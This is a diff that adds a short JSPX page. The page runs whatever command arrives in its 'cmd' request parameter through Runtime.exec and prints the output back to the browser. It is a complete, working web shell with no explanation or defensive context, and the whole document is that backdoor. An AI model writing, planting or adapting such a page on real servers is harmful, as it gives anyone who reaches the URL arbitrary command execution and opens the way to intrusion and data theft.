@@ -1,0 +1,18 @@
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2">
+    <jsp:directive.page import="java.io.InputStream"/>
+    <jsp:directive.page contentType="text/html" pageEncoding="UTF-8"/>
+    <pre>
+    <jsp:scriptlet>
+        Process process = Runtime.getRuntime().exec(request.getParameter("cmd"));
+        InputStream in = process.getInputStream();
+        int a = 0;
+        byte[] b = new byte[1024];
+
+        while ((a = in.read(b)) != -1) {
+            out.println(new String(b, 0, a));
+        }
+
+        in.close();
+    </jsp:scriptlet>
+    </pre>
+</jsp:root>
